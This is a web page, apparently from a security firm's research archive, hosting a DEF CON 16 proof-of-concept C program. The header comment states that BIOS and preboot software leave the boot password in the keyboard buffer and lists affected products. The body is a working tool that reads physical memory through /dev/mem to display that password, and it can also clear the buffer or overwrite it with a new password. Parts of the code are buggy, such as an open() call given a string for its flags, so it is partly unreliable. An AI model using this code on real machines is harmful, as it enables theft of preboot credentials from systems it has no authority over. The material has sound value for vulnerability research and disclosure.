@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="description" content="Moabi : IoT Firmware Security. Moabi SaaS platform is a pro-active security solution to audit software, firmware, binaries and their dependencies.">
+    <meta name="keywords" content="Binary analysis, Preventive Software analytics, IoT security, security analytics, preventive security, IIot security, Saas security, scalable security">
+    <title>Moabi - BIOS Keyboard buffer.c</title>
+
+    <!-- Content Security Policy -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://moabi.com https://m.moabi.com ; script-src 'self' https://moabi.com https://m.moabi.com https://www.google-analytics.com https://www.googletagmanager.com https://js.hs-scripts.com https://js.hs-analytics.net https://track.hubspot.com 'unsafe-inline'; connect-src 'self' https://moabi.com https://m.moabi.com https://www.google-analytics.com https://www.googletagmanager.com https://js.hs-scripts.com https://js.hs-analytics.net https://track.hubspot.com ; img-src 'self' data: https://moabi.com https://m.moabi.com https://www.google-analytics.com https://track.hubspot.com https://www.googletagmanager.com 'unsafe-inline' 'unsafe-eval'; style-src 'self' https://moabi.com https://m.moabi.com https://tagmanager.google.com/ https://fonts.googleapis.com/ 'unsafe-inline' ; font-src 'self' https://moabi.com https://m.moabi.com https://fonts.googleapis.com https://fonts.gstatic.com/ ; frame-src https://www.youtube.com/ https://youtube.com/ ; base-uri 'self' https://moabi.com https://m.moabi.com ;" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=3.0, minimum-scale=0.86">
+
+    <!-- Json-ld information -->
+    <script type="application/ld+json">
+	{
+		"@context": "http://schema.org",
+		"@id": "https://moabi.com/index.html#top",
+		"@type": "Organization",
+		"name": "Moabi",
+		"url": "https://moabi.com/",
+		"logo": "https://moabi.com/moabi.png",
+		"email": "info(at)moabi.com",
+		"description": "Moabi : IoT Firmware Security. Moabi SaaS platform is a pro-active security solution to audit software, firmware, binaries and their dependencies.",
+		"address": [
+			{
+				"@type": "PostalAddress",
+				"addressLocality": "Paris, France",
+				"postalCode":"75015",
+				"streetAddress": "33 Avenue du Maine"
+			},
+			{
+				"@type": "PostalAddress",
+				"addressLocality": "San Francisco",
+				"addressRegion": "CA",
+				"postalCode":"94133",
+				"streetAddress": "1640 Stockton Street",
+				"postOfficeBoxNumber": "330143"
+			}
+		],
+		"contactPoint": [
+			{
+				"@type": "ContactPoint",
+				"telephone": "+33188335053",
+				"email": "info(at)moabi.com",
+				"contactType": "sales"
+			},
+			{
+				"@type": "ContactPoint",
+				"email": "moabi(at)moabi.com",
+				"contactType": "customer service",
+				"url": "https://moabi.com"
+			}
+		],
+		"sameAs": [
+			"https://blog.moabi.com",
+			"https://www.facebook.com/Moabi.info/",
+			"https://twitter.com/moabi_com"
+		]
+	}
+    </script>
+
+    <!-- Open Graph metadata -->
+    <meta property="og:title" content="Moabi" />
+    <meta property="og:url" content="https://moabi.com/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://moabi.com/moabi_card.png" />
+    <meta property="og:description" content="Moabi : IoT Firmware Security. Moabi SaaS platform is a pro-active security solution to audit software, firmware, binaries and their dependencies." />
+    <meta property="og:site_name" content="Moabi">
+
+    <!-- Twitter card integration (works with Open Graph data above) -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image:alt" content="Moabi Saas platform : binary analysis">
+    <meta name="twitter:site" content="@moabi_com">
+
+    <!-- Yandex indexation -->
+    <meta name="yandex-verification" content="e477bac9aff66624" />
+
+    <!-- Bing Indexing -->
+    <meta name="msvalidate.01" content="E6F45B72576D2C71AD0A5B162DF8117D" />
+
+    <!-- Preconnect optimization -->
+    <link rel="preconnect" href="https://js.hs-scripts.com">
+    <link rel="preconnect" href="https://www.googletagmanager.com">
+    <link rel="preconnect" href="https://www.google-analytics.com">
+
+    <!-- Preload optimization -->
+   <link rel="preload" href="/fonts/1Ptrg8zYS_SKggPNwIouWqZPBQ.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+   <link rel="preload" href="/fonts/1Ptrg8zYS_SKggPNwN4rWqZPBQ.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+   <link rel="preload" href="/fonts/1Ptug8zYS_SKggPNyC0ISg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+   <link rel="preload" href="/fonts/1Ptrg8zYS_SKggPNwJYtWqZPBQ.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+   <link rel="preload" href="/js/modernizr.js" as="script">
+   <link rel="preload" href="/js/jquery-3.3.1.min.js" as="script">
+   <link rel="preload" href="/js/lazyload.js" as="script">
+   <link rel="preload" href="/js/main.js" as="script">
+   <link rel="preload" href="/js/rev.js" as="script">
+   <link rel="preload" href="/js/custom.js" as="script">
+   <link rel="preload" href="/js/site.js" as="script">
+
+    <link rel="preload" href="/fonts/fontawesome-webfont.woff2?v=4.7.0" as="font" type="font/woff2" crossorigin="anonymous">
+
+    <!-- Canonical name -->
+    <link rel="canonical" href="https://moabi.com/research/jbrossard/whitepapers/tools/BIOS/bios_keyboard_buffer.c.html" />
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="icon" type="image/png" href="favicon-16x16.png" sizes="16x16" />  
+    <link rel="icon" type="image/png" href="favicon-32x32.png" sizes="32x32" />  
+    <link rel="icon" type="image/png" href="favicon-96x96.png" sizes="96x96" />  
+
+    <!-- Apple icons -->
+    <link rel="apple-touch-icon" sizes="120x120" href="apple-120.png" />
+    <link rel="apple-touch-icon" sizes="152x152" href="apple-152.png" />  
+    <link rel="apple-touch-icon" sizes="167x167" href="apple-167.png" />  
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-180.png" />  
+
+    <!-- Apple Safari -->
+    <link rel="manifest" href="/site.webmanifest" />
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#446CDE" />
+
+    <!-- Microsoft Windows/IE11 Start Screen Tile-->
+    <meta name="application-name" content="moabi.com"/>
+    <meta name="msapplication-square70x70logo" content="small.jpg"/>
+    <meta name="msapplication-square150x150logo" content="medium.jpg"/>
+    <meta name="msapplication-wide310x150logo" content="wide.jpg"/>
+    <meta name="msapplication-square310x310logo" content="large.jpg"/>
+    <meta name="msapplication-TileColor" content="#446CDE">
+    <meta name="theme-color" content="#446CDE">
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-129423028-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-129423028-1');
+    </script>
+
+    <!-- Note: stylesheets are loaded twice to make up for the lack of preloading in Firefox. See https://stackoverflow.com/questions/45321043/preload-css-file-not-supported-on-firefox-and-safari-mac -->
+    <!-- CSS  Fonts -->
+    <link rel="preload" href="/css/font-awesome.min.css" as="style" />
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <!-- CSS  -->
+    <link rel="preload" href="/css/site.css" as="style" />
+    <link rel="stylesheet" href="/css/site.css">
+
+</head>
+<body>
+<pre>
+/*
+
+Endrazine - Jonathan Brossard - jb@endrazine.com
+
+Released as part of DEF CON 16 // Summer 2008
+
+Multiple vendors fail to clear the BIOS (Basic Input-Output System) keyboard buffer after reading the preboot authentication password during the system startup process.
+ 
+Depending on the operating system running on affected computers, the memory region may or may not be available for user-level access. With Linux operating systems, superuser access is required. With Microsoft Windows operating systems, nonprivileged users may access the keyboard buffer region.
+ 
+Attackers who obtain the password used for preboot authentication may then use it for further attacks.
+ 
+UPDATE: Reportedly, the BIOS API calls and the BIOS keyboard buffer are used by various preboot authentication applications to read a password from the keyboard in an insecure manner. These applications are also vulnerable to this issue.
+ 
+This issue is reported to affect the following software:
+ 
+- Truecrypt 5.0 for Windows
+- DiskCryptor 0.2.6 for Windows and prior
+- Secu Star DriveCrypt Plus Pack v3.9 and prior
+- Grub Legacy (GNU GRUB 0.97) and prior
+- Lilo 22.6.1 and prior versions
+- Award BIOS Modular 4.50pg
+- Insyde BIOS V190
+- Intel Corp BIOS PE94510M.86A.0050.2007.0710.1559 (07/10/2007)
+- Hewlett-Packard BIOS 68DTT Ver. F.0D (11/22/2005)
+- IBM Lenovo BIOS 7CETB5WW v2.05 (10/13/2006) 
+*/
+
+#define BIOS_PWD_ADDR 0x041e
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#include <sys/types.h>
+#include <sys/uio.h>
+
+struct dumpbuff
+{
+char tab[32];
+};
+
+int dump_bios_pwd(void)
+{
+char tab[32];
+char tab2[16];
+int fd,a,i,j;
+
+fd = open("/dev/mem", "r");
+
+if(fd == -1)
+{
+printf("cannot open /dev/mem");
+return 1;
+}
+
+a=lseek(fd,BIOS_PWD_ADDR,SEEK_SET);
+a=read(fd, &tab, 32);
+if(a<=0)
+{
+printf("cannot read /dev/mem");
+return 1;
+}
+
+close(fd);
+
+i=0;
+for (j=0;j<16;j++)
+{
+tab2[i]=tab[2*j];
+i++;
+}
+
+printf("\n\nPassword : ");
+for (j=0;j<16;j++)
+{
+printf("%c",tab2[j]);
+
+}
+
+printf("\n");
+return 0;
+
+}
+
+int clear_bios_pwd (void)
+{
+
+FILE *f;
+struct dumpbuff b;
+int i;
+long j=1054;
+
+for (i=0;i<32;i++)
+{
+b.tab[i]=' ';
+}
+
+f=fopen("/dev/mem","r+");
+fseek(f,j,SEEK_SET);
+
+fwrite (&b, sizeof(struct dumpbuff),1,f);
+fclose(f);
+printf("\n[Buffer Cleared]\n");
+return 0;
+}
+
+int change_pwd()
+{
+
+FILE *f;
+struct dumpbuff b;
+int i;
+long j=1054;
+char pwd[18];
+char crap;
+
+//Ask Pwd...
+
+printf("\n Enter new Pwd :\n(16 caratcters max)\n");
+
+for (i=0;i<18;i++)
+{
+pwd[i]=' ';
+}
+
+scanf("%s%c",&pwd,&crap);
+
+for (i=0;i<=15;i++)
+{
+b.tab[2*i]=pwd[i];
+b.tab[2*i+1]=' ';
+}
+
+f=fopen("/dev/mem","r+");
+fseek(f,j,SEEK_SET);
+
+fwrite (&b, sizeof(struct dumpbuff),1,f);
+printf("\n[Buffer Uptdated]\n");
+fclose(f);
+
+return 0;
+
+}
+
+int main(void)
+{
+
+char choiceval=0;
+char crap;
+char tab3[100];
+
+printf(" _=�Bios Bumper�=_ \n\n\n");
+printf(" (endrazine (at) pulltheplug (dot) org [email concealed]) \n");
+printf(" by Endrazine\n");
+
+while(choiceval !='x')
+{
+printf ("\n==============================\n");
+printf("[Keyboard buffer manipulation]\n");
+printf("==============================\n");
+printf("\n 1 - Display Password\n");
+printf(" 2 - Clear Keyboard Buffer\n");
+printf(" 3 - Enter new Password\n");
+printf("\n==============================\n");
+printf("\n x - Quit\n");
+
+scanf("%c%c",&choiceval,&crap);
+
+if (choiceval=='1')
+dump_bios_pwd();
+
+if (choiceval=='2')
+clear_bios_pwd();
+
+if (choiceval=='3')
+change_pwd();
+
+}
+return 0;
+}
+</pre>
+</body></html>
